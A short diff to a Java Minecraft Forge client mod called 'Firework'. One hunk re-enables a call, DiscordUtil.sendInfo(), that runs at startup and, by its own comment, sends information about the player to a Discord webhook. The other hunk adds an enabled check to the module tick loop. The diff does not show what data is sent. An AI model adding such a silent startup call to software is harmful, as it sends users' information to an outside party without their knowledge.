@@ -100,7 +100,7 @@ public class Firework
         //Makes this class available for handling events
         MinecraftForge.EVENT_BUS.register(this);
         //Sends info about player running client to the discord webhook
-        //DiscordUtil.sendInfo();
+        DiscordUtil.sendInfo();
         //Sets custom window title when client is loading
         Display.setTitle("Loading Firework (FMLPreInitializationEvent)");
 
@@ -138,8 +138,9 @@ public class Firework
     @SubscribeEvent
     public void onTick(TickEvent.ClientTickEvent event){
         for(Module m : moduleManager.modules){
-            if(!m.isNonCycle)
-                m.tryToExecute();
+            if(m.isEnabled.getValue())
+                if(!m.isNonCycle)
+                    m.tryToExecute();
         }
     }
 
